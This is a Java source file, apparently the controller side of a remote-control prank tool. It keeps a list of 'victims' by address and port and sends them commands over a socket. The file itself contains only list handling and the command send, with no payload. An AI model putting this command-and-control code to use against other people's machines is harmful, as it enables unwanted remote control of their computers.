package com.master.zueira.controller;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import com.master.zueira.object.Victim;

public class VictimControllerImpl implements VictimController {

	private static final VictimControllerListener WITHOUT_LISTENER = new VictimControllerListener() {

		@Override
		public void changed() {
		}

	};

	private VictimControllerListener listener = VictimControllerImpl.WITHOUT_LISTENER;

	private int selected = -1;

	private final List<Victim> victims = new ArrayList<Victim>();

	public VictimControllerImpl() {
	}

	@Override
	public void addVictim(final String name, final String address, final int service) {
		this.victims.add(new Victim(name, address, service));
		this.listener.changed();
	}

	@Override
	public int count() {
		return this.victims.size();
	}

	@Override
	public Victim getSelectedVictim() {
		if (this.selected != -1) {
			return this.victims.get(this.selected);
		}
		return null;
	}

	@Override
	public Victim getVictim(final int index) {
		return this.victims.get(index);
	}

	public void removeListener() {
		this.listener = VictimControllerImpl.WITHOUT_LISTENER;

	}

	@Override
	public void removeVictim(final String address) {
		final Iterator<Victim> it = this.victims.iterator();
		while (it.hasNext()) {
			if (it.next().getAddress().equals(address)) {
				it.remove();
			}
		}
	}

	@Override
	public void removeVictim(final Victim victim) {
		this.removeVictim(victim.getAddress());
	}

	@Override
	public void setListener(final VictimControllerListener listener) {
		this.listener = listener;
		this.listener.changed();
	}

	@Override
	public void setSelected(final int selected) {
		this.selected = selected;
	}

	@Override
	public void zuar(final String zueira, final String value) {
		final Victim victim = this.getSelectedVictim();
		Socket s = null;
		try {
			s = new Socket(victim.getAddress(), victim.getService());
			final OutputStream out = s.getOutputStream();
			out.write((1 + "#" + zueira + "#" + value).getBytes());
			out.flush();
			out.close();
			s.close();
		} catch (final IOException e) {
			this.removeVictim(victim);
		}
	}

}
